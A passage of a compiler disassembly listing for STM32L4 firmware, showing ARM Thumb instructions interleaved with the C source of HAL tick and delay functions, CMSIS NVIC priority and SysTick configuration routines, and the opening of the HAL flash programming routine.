 800114c:	f000 f937 	bl	80013be <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 8001150:	4a0a      	ldr	r2, [pc, #40]	; (800117c <HAL_InitTick+0x74>)
 8001152:	687b      	ldr	r3, [r7, #4]
 8001154:	6013      	str	r3, [r2, #0]
 8001156:	e007      	b.n	8001168 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 8001158:	2301      	movs	r3, #1
 800115a:	73fb      	strb	r3, [r7, #15]
 800115c:	e004      	b.n	8001168 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 800115e:	2301      	movs	r3, #1
 8001160:	73fb      	strb	r3, [r7, #15]
 8001162:	e001      	b.n	8001168 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 8001164:	2301      	movs	r3, #1
 8001166:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 8001168:	7bfb      	ldrb	r3, [r7, #15]
}
 800116a:	4618      	mov	r0, r3
 800116c:	3710      	adds	r7, #16
 800116e:	46bd      	mov	sp, r7
 8001170:	bd80      	pop	{r7, pc}
 8001172:	bf00      	nop
 8001174:	20000008 	.word	0x20000008
 8001178:	20000000 	.word	0x20000000
 800117c:	20000004 	.word	0x20000004

08001180 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 8001180:	b480      	push	{r7}
 8001182:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 8001184:	4b06      	ldr	r3, [pc, #24]	; (80011a0 <HAL_IncTick+0x20>)
 8001186:	781b      	ldrb	r3, [r3, #0]
 8001188:	461a      	mov	r2, r3
 800118a:	4b06      	ldr	r3, [pc, #24]	; (80011a4 <HAL_IncTick+0x24>)
 800118c:	681b      	ldr	r3, [r3, #0]
 800118e:	4413      	add	r3, r2
 8001190:	4a04      	ldr	r2, [pc, #16]	; (80011a4 <HAL_IncTick+0x24>)
 8001192:	6013      	str	r3, [r2, #0]
}
 8001194:	bf00      	nop
 8001196:	46bd      	mov	sp, r7
 8001198:	f85d 7b04 	ldr.w	r7, [sp], #4
 800119c:	4770      	bx	lr
 800119e:	bf00      	nop
 80011a0:	20000008 	.word	0x20000008
 80011a4:	200003b8 	.word	0x200003b8

080011a8 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 80011a8:	b480      	push	{r7}
 80011aa:	af00      	add	r7, sp, #0
  return uwTick;
 80011ac:	4b03      	ldr	r3, [pc, #12]	; (80011bc <HAL_GetTick+0x14>)
 80011ae:	681b      	ldr	r3, [r3, #0]
}
 80011b0:	4618      	mov	r0, r3
 80011b2:	46bd      	mov	sp, r7
 80011b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80011b8:	4770      	bx	lr
 80011ba:	bf00      	nop
 80011bc:	200003b8 	.word	0x200003b8

080011c0 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 80011c0:	b580      	push	{r7, lr}
 80011c2:	b084      	sub	sp, #16
 80011c4:	af00      	add	r7, sp, #0
 80011c6:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 80011c8:	f7ff ffee 	bl	80011a8 <HAL_GetTick>
 80011cc:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 80011ce:	687b      	ldr	r3, [r7, #4]
 80011d0:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 80011d2:	68fb      	ldr	r3, [r7, #12]
 80011d4:	f1b3 3fff 	cmp.w	r3, #4294967295
 80011d8:	d005      	beq.n	80011e6 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 80011da:	4b0a      	ldr	r3, [pc, #40]	; (8001204 <HAL_Delay+0x44>)
 80011dc:	781b      	ldrb	r3, [r3, #0]
 80011de:	461a      	mov	r2, r3
 80011e0:	68fb      	ldr	r3, [r7, #12]
 80011e2:	4413      	add	r3, r2
 80011e4:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80011e6:	bf00      	nop
 80011e8:	f7ff ffde 	bl	80011a8 <HAL_GetTick>
 80011ec:	4602      	mov	r2, r0
 80011ee:	68bb      	ldr	r3, [r7, #8]
 80011f0:	1ad3      	subs	r3, r2, r3
 80011f2:	68fa      	ldr	r2, [r7, #12]
 80011f4:	429a      	cmp	r2, r3
 80011f6:	d8f7      	bhi.n	80011e8 <HAL_Delay+0x28>
  {
  }
}
 80011f8:	bf00      	nop
 80011fa:	bf00      	nop
 80011fc:	3710      	adds	r7, #16
 80011fe:	46bd      	mov	sp, r7
 8001200:	bd80      	pop	{r7, pc}
 8001202:	bf00      	nop
 8001204:	20000008 	.word	0x20000008

08001208 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001208:	b480      	push	{r7}
 800120a:	b085      	sub	sp, #20
 800120c:	af00      	add	r7, sp, #0
 800120e:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 8001210:	687b      	ldr	r3, [r7, #4]
 8001212:	f003 0307 	and.w	r3, r3, #7
 8001216:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8001218:	4b0c      	ldr	r3, [pc, #48]	; (800124c <__NVIC_SetPriorityGrouping+0x44>)
 800121a:	68db      	ldr	r3, [r3, #12]
 800121c:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 800121e:	68ba      	ldr	r2, [r7, #8]
 8001220:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 8001224:	4013      	ands	r3, r2
 8001226:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001228:	68fb      	ldr	r3, [r7, #12]
 800122a:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 800122c:	68bb      	ldr	r3, [r7, #8]
 800122e:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001230:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001234:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001238:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 800123a:	4a04      	ldr	r2, [pc, #16]	; (800124c <__NVIC_SetPriorityGrouping+0x44>)
 800123c:	68bb      	ldr	r3, [r7, #8]
 800123e:	60d3      	str	r3, [r2, #12]
}
 8001240:	bf00      	nop
 8001242:	3714      	adds	r7, #20
 8001244:	46bd      	mov	sp, r7
 8001246:	f85d 7b04 	ldr.w	r7, [sp], #4
 800124a:	4770      	bx	lr
 800124c:	e000ed00 	.word	0xe000ed00

08001250 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8001250:	b480      	push	{r7}
 8001252:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 8001254:	4b04      	ldr	r3, [pc, #16]	; (8001268 <__NVIC_GetPriorityGrouping+0x18>)
 8001256:	68db      	ldr	r3, [r3, #12]
 8001258:	0a1b      	lsrs	r3, r3, #8
 800125a:	f003 0307 	and.w	r3, r3, #7
}
 800125e:	4618      	mov	r0, r3
 8001260:	46bd      	mov	sp, r7
 8001262:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001266:	4770      	bx	lr
 8001268:	e000ed00 	.word	0xe000ed00

0800126c <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 800126c:	b480      	push	{r7}
 800126e:	b083      	sub	sp, #12
 8001270:	af00      	add	r7, sp, #0
 8001272:	4603      	mov	r3, r0
 8001274:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001276:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800127a:	2b00      	cmp	r3, #0
 800127c:	db0b      	blt.n	8001296 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 800127e:	79fb      	ldrb	r3, [r7, #7]
 8001280:	f003 021f 	and.w	r2, r3, #31
 8001284:	4907      	ldr	r1, [pc, #28]	; (80012a4 <__NVIC_EnableIRQ+0x38>)
 8001286:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800128a:	095b      	lsrs	r3, r3, #5
 800128c:	2001      	movs	r0, #1
 800128e:	fa00 f202 	lsl.w	r2, r0, r2
 8001292:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 8001296:	bf00      	nop
 8001298:	370c      	adds	r7, #12
 800129a:	46bd      	mov	sp, r7
 800129c:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012a0:	4770      	bx	lr
 80012a2:	bf00      	nop
 80012a4:	e000e100 	.word	0xe000e100

080012a8 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 80012a8:	b480      	push	{r7}
 80012aa:	b083      	sub	sp, #12
 80012ac:	af00      	add	r7, sp, #0
 80012ae:	4603      	mov	r3, r0
 80012b0:	6039      	str	r1, [r7, #0]
 80012b2:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80012b4:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012b8:	2b00      	cmp	r3, #0
 80012ba:	db0a      	blt.n	80012d2 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80012bc:	683b      	ldr	r3, [r7, #0]
 80012be:	b2da      	uxtb	r2, r3
 80012c0:	490c      	ldr	r1, [pc, #48]	; (80012f4 <__NVIC_SetPriority+0x4c>)
 80012c2:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012c6:	0112      	lsls	r2, r2, #4
 80012c8:	b2d2      	uxtb	r2, r2
 80012ca:	440b      	add	r3, r1
 80012cc:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 80012d0:	e00a      	b.n	80012e8 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80012d2:	683b      	ldr	r3, [r7, #0]
 80012d4:	b2da      	uxtb	r2, r3
 80012d6:	4908      	ldr	r1, [pc, #32]	; (80012f8 <__NVIC_SetPriority+0x50>)
 80012d8:	79fb      	ldrb	r3, [r7, #7]
 80012da:	f003 030f 	and.w	r3, r3, #15
 80012de:	3b04      	subs	r3, #4
 80012e0:	0112      	lsls	r2, r2, #4
 80012e2:	b2d2      	uxtb	r2, r2
 80012e4:	440b      	add	r3, r1
 80012e6:	761a      	strb	r2, [r3, #24]
}
 80012e8:	bf00      	nop
 80012ea:	370c      	adds	r7, #12
 80012ec:	46bd      	mov	sp, r7
 80012ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012f2:	4770      	bx	lr
 80012f4:	e000e100 	.word	0xe000e100
 80012f8:	e000ed00 	.word	0xe000ed00

080012fc <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80012fc:	b480      	push	{r7}
 80012fe:	b089      	sub	sp, #36	; 0x24
 8001300:	af00      	add	r7, sp, #0
 8001302:	60f8      	str	r0, [r7, #12]
 8001304:	60b9      	str	r1, [r7, #8]
 8001306:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001308:	68fb      	ldr	r3, [r7, #12]
 800130a:	f003 0307 	and.w	r3, r3, #7
 800130e:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 8001310:	69fb      	ldr	r3, [r7, #28]
 8001312:	f1c3 0307 	rsb	r3, r3, #7
 8001316:	2b04      	cmp	r3, #4
 8001318:	bf28      	it	cs
 800131a:	2304      	movcs	r3, #4
 800131c:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800131e:	69fb      	ldr	r3, [r7, #28]
 8001320:	3304      	adds	r3, #4
 8001322:	2b06      	cmp	r3, #6
 8001324:	d902      	bls.n	800132c <NVIC_EncodePriority+0x30>
 8001326:	69fb      	ldr	r3, [r7, #28]
 8001328:	3b03      	subs	r3, #3
 800132a:	e000      	b.n	800132e <NVIC_EncodePriority+0x32>
 800132c:	2300      	movs	r3, #0
 800132e:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001330:	f04f 32ff 	mov.w	r2, #4294967295
 8001334:	69bb      	ldr	r3, [r7, #24]
 8001336:	fa02 f303 	lsl.w	r3, r2, r3
 800133a:	43da      	mvns	r2, r3
 800133c:	68bb      	ldr	r3, [r7, #8]
 800133e:	401a      	ands	r2, r3
 8001340:	697b      	ldr	r3, [r7, #20]
 8001342:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8001344:	f04f 31ff 	mov.w	r1, #4294967295
 8001348:	697b      	ldr	r3, [r7, #20]
 800134a:	fa01 f303 	lsl.w	r3, r1, r3
 800134e:	43d9      	mvns	r1, r3
 8001350:	687b      	ldr	r3, [r7, #4]
 8001352:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001354:	4313      	orrs	r3, r2
         );
}
 8001356:	4618      	mov	r0, r3
 8001358:	3724      	adds	r7, #36	; 0x24
 800135a:	46bd      	mov	sp, r7
 800135c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001360:	4770      	bx	lr
	...

08001364 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 8001364:	b580      	push	{r7, lr}
 8001366:	b082      	sub	sp, #8
 8001368:	af00      	add	r7, sp, #0
 800136a:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 800136c:	687b      	ldr	r3, [r7, #4]
 800136e:	3b01      	subs	r3, #1
 8001370:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 8001374:	d301      	bcc.n	800137a <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 8001376:	2301      	movs	r3, #1
 8001378:	e00f      	b.n	800139a <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 800137a:	4a0a      	ldr	r2, [pc, #40]	; (80013a4 <SysTick_Config+0x40>)
 800137c:	687b      	ldr	r3, [r7, #4]
 800137e:	3b01      	subs	r3, #1
 8001380:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 8001382:	210f      	movs	r1, #15
 8001384:	f04f 30ff 	mov.w	r0, #4294967295
 8001388:	f7ff ff8e 	bl	80012a8 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 800138c:	4b05      	ldr	r3, [pc, #20]	; (80013a4 <SysTick_Config+0x40>)
 800138e:	2200      	movs	r2, #0
 8001390:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 8001392:	4b04      	ldr	r3, [pc, #16]	; (80013a4 <SysTick_Config+0x40>)
 8001394:	2207      	movs	r2, #7
 8001396:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 8001398:	2300      	movs	r3, #0
}
 800139a:	4618      	mov	r0, r3
 800139c:	3708      	adds	r7, #8
 800139e:	46bd      	mov	sp, r7
 80013a0:	bd80      	pop	{r7, pc}
 80013a2:	bf00      	nop
 80013a4:	e000e010 	.word	0xe000e010

080013a8 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80013a8:	b580      	push	{r7, lr}
 80013aa:	b082      	sub	sp, #8
 80013ac:	af00      	add	r7, sp, #0
 80013ae:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 80013b0:	6878      	ldr	r0, [r7, #4]
 80013b2:	f7ff ff29 	bl	8001208 <__NVIC_SetPriorityGrouping>
}
 80013b6:	bf00      	nop
 80013b8:	3708      	adds	r7, #8
 80013ba:	46bd      	mov	sp, r7
 80013bc:	bd80      	pop	{r7, pc}

080013be <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80013be:	b580      	push	{r7, lr}
 80013c0:	b086      	sub	sp, #24
 80013c2:	af00      	add	r7, sp, #0
 80013c4:	4603      	mov	r3, r0
 80013c6:	60b9      	str	r1, [r7, #8]
 80013c8:	607a      	str	r2, [r7, #4]
 80013ca:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 80013cc:	2300      	movs	r3, #0
 80013ce:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 80013d0:	f7ff ff3e 	bl	8001250 <__NVIC_GetPriorityGrouping>
 80013d4:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 80013d6:	687a      	ldr	r2, [r7, #4]
 80013d8:	68b9      	ldr	r1, [r7, #8]
 80013da:	6978      	ldr	r0, [r7, #20]
 80013dc:	f7ff ff8e 	bl	80012fc <NVIC_EncodePriority>
 80013e0:	4602      	mov	r2, r0
 80013e2:	f997 300f 	ldrsb.w	r3, [r7, #15]
 80013e6:	4611      	mov	r1, r2
 80013e8:	4618      	mov	r0, r3
 80013ea:	f7ff ff5d 	bl	80012a8 <__NVIC_SetPriority>
}
 80013ee:	bf00      	nop
 80013f0:	3718      	adds	r7, #24
 80013f2:	46bd      	mov	sp, r7
 80013f4:	bd80      	pop	{r7, pc}

080013f6 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80013f6:	b580      	push	{r7, lr}
 80013f8:	b082      	sub	sp, #8
 80013fa:	af00      	add	r7, sp, #0
 80013fc:	4603      	mov	r3, r0
 80013fe:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 8001400:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001404:	4618      	mov	r0, r3
 8001406:	f7ff ff31 	bl	800126c <__NVIC_EnableIRQ>
}
 800140a:	bf00      	nop
 800140c:	3708      	adds	r7, #8
 800140e:	46bd      	mov	sp, r7
 8001410:	bd80      	pop	{r7, pc}

08001412 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 8001412:	b580      	push	{r7, lr}
 8001414:	b082      	sub	sp, #8
 8001416:	af00      	add	r7, sp, #0
 8001418:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 800141a:	6878      	ldr	r0, [r7, #4]
 800141c:	f7ff ffa2 	bl	8001364 <SysTick_Config>
 8001420:	4603      	mov	r3, r0
}
 8001422:	4618      	mov	r0, r3
 8001424:	3708      	adds	r7, #8
 8001426:	46bd      	mov	sp, r7
 8001428:	bd80      	pop	{r7, pc}
	...

0800142c <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 800142c:	b580      	push	{r7, lr}
 800142e:	b086      	sub	sp, #24
 8001430:	af00      	add	r7, sp, #0
 8001432:	60f8      	str	r0, [r7, #12]
 8001434:	60b9      	str	r1, [r7, #8]
 8001436:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 800143a:	2300      	movs	r3, #0
 800143c:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800143e:	4b2f      	ldr	r3, [pc, #188]	; (80014fc <HAL_FLASH_Program+0xd0>)
 8001440:	781b      	ldrb	r3, [r3, #0]
 8001442:	2b01      	cmp	r3, #1
 8001444:	d101      	bne.n	800144a <HAL_FLASH_Program+0x1e>
 8001446:	2302      	movs	r3, #2
 8001448:	e053      	b.n	80014f2 <HAL_FLASH_Program+0xc6>
 800144a:	4b2c      	ldr	r3, [pc, #176]	; (80014fc <HAL_FLASH_Program+0xd0>)
 800144c:	2201      	movs	r2, #1
 800144e:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001450:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001454:	f000 f888 	bl	8001568 <FLASH_WaitForLastOperation>
 8001458:	4603      	mov	r3, r0
 800145a:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 800145c:	7dfb      	ldrb	r3, [r7, #23]
 800145e:	2b00      	cmp	r3, #0
 8001460:	d143      	bne.n	80014ea <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 8001462:	4b26      	ldr	r3, [pc, #152]	; (80014fc <HAL_FLASH_Program+0xd0>)
 8001464:	2200      	movs	r2, #0
 8001466:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001468:	4b25      	ldr	r3, [pc, #148]	; (8001500 <HAL_FLASH_Program+0xd4>)
 800146a:	681b      	ldr	r3, [r3, #0]
 800146c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001470:	2b00      	cmp	r3, #0
 8001472:	d009      	beq.n	8001488 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001474:	4b22      	ldr	r3, [pc, #136]	; (8001500 <HAL_FLASH_Program+0xd4>)
 8001476:	681b      	ldr	r3, [r3, #0]
 8001478:	4a21      	ldr	r2, [pc, #132]	; (8001500 <HAL_FLASH_Program+0xd4>)
 800147a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800147e:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001480:	4b1e      	ldr	r3, [pc, #120]	; (80014fc <HAL_FLASH_Program+0xd0>)
 8001482:	2202      	movs	r2, #2
 8001484:	771a      	strb	r2, [r3, #28]
 8001486:	e002      	b.n	800148e <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001488:	4b1c      	ldr	r3, [pc, #112]	; (80014fc <HAL_FLASH_Program+0xd0>)
 800148a:	2200      	movs	r2, #0
 800148c:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 800148e:	68fb      	ldr	r3, [r7, #12]
 8001490:	2b00      	cmp	r3, #0
 8001492:	d107      	bne.n	80014a4 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 8001494:	e9d7 2300 	ldrd	r2, r3, [r7]
 8001498:	68b8      	ldr	r0, [r7, #8]
 800149a:	f000 f8bd 	bl	8001618 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 800149e:	2301      	movs	r3, #1
 80014a0:	613b      	str	r3, [r7, #16]
 80014a2:	e010      	b.n	80014c6 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 80014a4:	68fb      	ldr	r3, [r7, #12]
 80014a6:	2b01      	cmp	r3, #1
 80014a8:	d002      	beq.n	80014b0 <HAL_FLASH_Program+0x84>
 80014aa:	68fb      	ldr	r3, [r7, #12]
 80014ac:	2b02      	cmp	r3, #2
 80014ae:	d10a      	bne.n	80014c6 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 80014b0:	683b      	ldr	r3, [r7, #0]
 80014b2:	4619      	mov	r1, r3
 80014b4:	68b8      	ldr	r0, [r7, #8]
 80014b6:	f000 f8d5 	bl	8001664 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 80014ba:	68fb      	ldr	r3, [r7, #12]
 80014bc:	2b02      	cmp	r3, #2
 80014be:	d102      	bne.n	80014c6 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 80014c0:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 80014c4:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80014c6:	f24c 3050 	movw	r0, #50000	; 0xc350
 80014ca:	f000 f84d 	bl	8001568 <FLASH_WaitForLastOperation>
 80014ce:	4603      	mov	r3, r0
 80014d0:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 80014d2:	693b      	ldr	r3, [r7, #16]
 80014d4:	2b00      	cmp	r3, #0
 80014d6:	d006      	beq.n	80014e6 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 80014d8:	4b09      	ldr	r3, [pc, #36]	; (8001500 <HAL_FLASH_Program+0xd4>)
